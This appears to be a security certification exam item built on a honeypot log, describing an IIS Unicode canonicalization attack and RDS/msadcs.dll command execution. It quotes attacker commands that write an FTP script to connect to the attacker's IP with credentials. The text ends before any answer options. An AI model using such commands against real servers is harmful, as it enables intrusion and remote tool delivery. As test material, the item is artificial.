Question #40 Topic 1 ,"The following excerpt is taken from a honeypot log that was hosted at lab.wiretrip.net. Snort reported Unicode attacks from 213.116.251.162. The File Permission
Canonicalization vulnerability (UNICODE attack) allows scripts to be run in arbitrary folders that do not normally have the right to run scripts. The attacker tries a
Unicode attack and eventually succeeds in displaying boot.ini.
He then switches to playing with RDS, via msadcs.dll. The RDS vulnerability allows a malicious user to construct SQL statements that will execute shell commands (such as CMD.EXE) on the IIS server. He does a quick query to discover that the directory exists, and a query to msadcs.dll shows that it is functioning correctly. The attacker makes a RDS query which results in the commands run as shown below.
""cmd1.exe /c open 213.116.251.162 >ftpcom""
""cmd1.exe /c echo johna2k >>ftpcom""
""cmd1.exe /c echo haxedj00 >>ftpcom""
